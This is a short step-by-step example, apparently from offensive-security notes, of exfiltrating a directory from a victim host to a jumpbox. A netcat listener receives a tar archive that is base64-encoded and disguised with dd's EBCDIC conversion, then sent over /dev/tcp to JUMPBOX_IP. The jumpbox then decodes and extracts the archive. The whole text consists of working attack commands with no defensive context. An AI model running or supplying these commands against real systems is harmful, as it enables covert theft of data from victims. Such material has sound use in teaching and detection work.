## Example:

#### 1) Jumpbox: nc -lvnp 8080 > /tmp/data

#### 2) Jumpbox ssh USER@VICTIM_IP or DOMAIN

#### 3) Attacker: ssh USER@VICTIM_IP -p 2022 (example)

#### 4) Victim1: tar zcf - dir/ | base64 | dd conv=ebcdic > /dev/tcp/JUMPBOX_IP/8080

#### 5) Jumpbox: ls -l /tmp/

#### 6) Jumpbox: cd /tmp/

#### 7) Jumpbox: dd conv=ascii if=data | base64 -d > data.tar

#### 8) Jumpbox: tar xvf data.tar

#### 9) Jumpbox: cat data.txt
